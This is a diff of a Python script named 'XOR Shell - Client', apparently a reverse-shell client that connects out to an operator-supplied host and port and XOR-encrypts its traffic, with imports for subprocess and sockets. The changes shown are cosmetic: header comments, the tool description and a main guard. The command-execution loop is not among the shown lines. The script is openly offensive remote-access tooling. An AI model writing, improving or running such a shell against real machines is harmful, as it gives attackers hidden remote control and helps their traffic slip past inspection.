@@ -1,16 +1,15 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# Python all
-# made by  Xtr3am3r.0k@gmail.com
-# need pycrypto https://www.dlitz.net/software/pycrypto/
-
+# -*- encoding: utf-8 -*-
+# Python 3.X.X
+# Autors: Xtr3am3r.0k@gmail.com, jerskisnow
+# Requirements: pycrypto (https://www.dlitz.net/software/pycrypto/)
 import os
 import subprocess
 import argparse
 from socket import socket, AF_INET, SOCK_STREAM
 from Crypto.Cipher import XOR
 
-parser = argparse.ArgumentParser(description='XOR Shell Client')
+parser = argparse.ArgumentParser(description='XOR Shell - Client')
 parser.add_argument('-a','--host', help='set lhost', required=True)
 parser.add_argument('-p','--port', help='set lport', required=True)
 parser.add_argument('-k','--key', help='set XOR key', required=True)
@@ -27,7 +26,6 @@ def encrypter(cleardata):
 def decrypter(cleardata):
     data = XOR.XORCipher(key)
     return data.decrypt(cleardata)
-
 
 def client():
     sockobj = socket(AF_INET, SOCK_STREAM)
@@ -52,7 +50,5 @@ def client():
 
     sockobj.close()
 
-try:
+if __name__ == "__main__":
     client()
-except:
-    print('An error occured')
